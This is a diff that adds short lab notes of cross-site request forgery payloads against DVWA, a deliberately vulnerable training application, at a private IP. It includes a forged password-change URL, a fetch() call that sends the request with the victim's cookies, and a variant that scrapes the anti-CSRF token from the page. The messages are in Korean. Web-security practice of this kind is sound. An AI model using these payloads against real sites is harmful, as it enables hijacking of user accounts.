@@ -1,0 +1,15 @@
+http://192.168.136.135/dvwa/vulnerabilities/csrf/?password_new=1111&password_conf=1111&Change=Change
+
+-------------------------------------
+
+fetch('?password_new=1111&password_conf=1111&Change=Change', { credentials: 'include' })
+  .then(r => r.text())
+  .then(t => alert(t.includes('Password Changed') ? '성공: 1111로 변경됨' : '실패'));
+
+----------------------------------
+
+var t = document.querySelector('input[name=user_token]').value;
+fetch('?password_new=1111&password_conf=1111&user_token=' + t + '&Change=Change',
+      { credentials: 'include' })
+  .then(r => r.text())
+  .then(x => alert(x.includes('Password Changed') ? '성공: 1111로 변경됨' : '실패'));
